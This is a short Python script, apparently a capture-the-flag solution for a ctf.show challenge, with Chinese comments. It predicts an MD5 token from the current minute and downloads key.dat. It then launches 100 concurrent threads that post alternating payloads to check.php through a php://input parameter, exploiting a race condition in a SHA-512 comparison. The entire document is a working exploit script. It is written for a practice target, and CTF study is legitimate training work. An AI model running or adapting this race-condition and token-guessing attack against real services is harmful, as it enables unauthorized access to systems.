import requests
import datetime
import threading
import hashlib
 
# 获取当前时间的分钟
t = datetime.datetime.now().minute
token = hashlib.md5(str(t).encode()).hexdigest()
 
# 下载key.dat
url = "http://4540015e-3058-45f0-a207-6c38a0df723e.challenge.ctf.show/"
r1 = requests.get(url + "key.dat")
with open('key.dat', 'wb') as f:
    f.write(r1.content)
 
 
def upload_data(url, data):
    # 通过php://input上传flag.dat的数据
    url = f"{url}check.php?token={token}&php://input"
    s = requests.post(url, data=data)
    print(s.text)
 
 
with open('key.dat', 'rb') as f:
    data1 = f.read()
 
for i in range(50):
    threading.Thread(target=upload_data, args=(url, data1)).start()
for i in range(50):
    # sha512进行判断，让它不相等
    data2 = 'We are not equal'
    threading.Thread(target=upload_data, args=(url, data2)).start()